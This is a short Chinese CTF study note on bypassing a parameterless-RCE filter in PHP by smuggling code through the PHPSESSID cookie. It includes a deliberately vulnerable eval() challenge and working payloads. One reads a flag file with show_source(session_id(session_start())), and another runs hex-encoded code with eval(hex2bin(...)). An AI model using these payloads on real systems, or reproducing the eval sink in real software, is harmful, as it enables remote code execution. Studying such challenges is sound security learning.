---
title: 命令执行 | 无参数命令执行sessionRCE
date: 2026-04-21 20:00:00 +0800
categories: [笔记]
tags: [命令执行, 无参数RCE]
---

## 题目
---

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

if (';' === preg_replace('/[^\W]+\((?R)?\)', '', $_GET['code'])){
	eval($_GET['code']);
}
?>
```



## 函数
---

`session_start()`
启动新会话或者重用现有会话，成功开始会话返回True，否则返回False

`?code=print_r(session_start());`
返回结果为1

`?code=print_r(session_id(session_start()));`
返回请求报文中cookie子段PHPSESSID的值


## 实战
---

### 情形一：已确实flag位置，不要执行命令，不需要hex编码

```text
用bp修改cookie子段PHPSESSID的值为`./flag`

`?code=show_source(session_id(session_start()))`
```


### 情形二：不确定flag位置，要执行命令，需要hex编码

```text
用bp修改cookie子段PHPSESSID的值为`706870696e666f28293b`(`phpinfo();`)

`?code=eval(hex2bin(session_id(session_start())));`
```



>  在cookie子段PHPID值中直接载入函数，是无法直接执行的
> 
   需要将其HEX编码为十六进制后
> 
   再配合payload中的`hex2bin()`函数将十六进制转换为二进制
> 
>  随后交给`eval()`执行